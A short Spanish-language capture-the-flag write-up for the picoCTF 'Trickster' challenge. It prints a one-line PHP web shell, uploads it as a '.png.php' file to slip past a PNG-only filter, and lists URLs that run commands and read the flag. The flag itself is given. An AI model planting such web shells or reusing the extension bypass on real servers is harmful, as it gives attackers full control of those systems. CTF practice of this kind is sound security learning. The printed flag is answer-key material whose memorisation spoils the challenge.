## Trickster
## Descripcion

I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:60055/)!
## Solucion

- Usaremos el web shell:

`<?php if(isset($_REQUEST['cmd']))      system($_REQUEST['cmd']); ?>`

- Lo subimos a la aplicación
- Ejecutamos comandos usando webshell, que asumimos se guardo en /uploads

`http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd=ls http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd=ls .. http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd= cat ../GAZWIMLEGU2DQ.txt`

**picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548} **
## Notas

**Importante:**  
Un webshell permite **control total del servidor**, por lo que **solo debe usarse en laboratorios, CTFs o sistemas donde tengas permiso**.
## Referencias
 python requests: [https://www.w3schools.com/python/module_requests.asp](https://www.w3schools.com/python/module_requests.asp "https://www.w3schools.com/python/module_requests.asp")

Métodos de Solución:
- Consola
- Python